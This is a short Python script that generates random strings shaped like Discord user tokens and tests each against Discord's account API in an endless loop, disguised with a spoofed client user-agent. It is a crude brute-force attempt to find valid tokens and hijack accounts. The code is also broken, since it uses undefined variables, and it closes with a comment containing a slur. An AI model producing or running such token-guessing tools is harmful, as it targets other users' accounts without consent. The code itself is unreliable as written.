import requests, random, time
API = "https://discordapp.com/api/users/@me"

Character = {"a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0"}

while True:
    Token = str(TokenIdentify + TokenSep + "".join(random.sample(Character, 27)))

    Data = requests.get(API, headers={'Authorization': Token, 'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'})

    print(f"Token:{Token}\nData:\nCode:{Data.status_code}\nContent:{Data.content}")

    #You're a retard if you think you're going to generate a token.
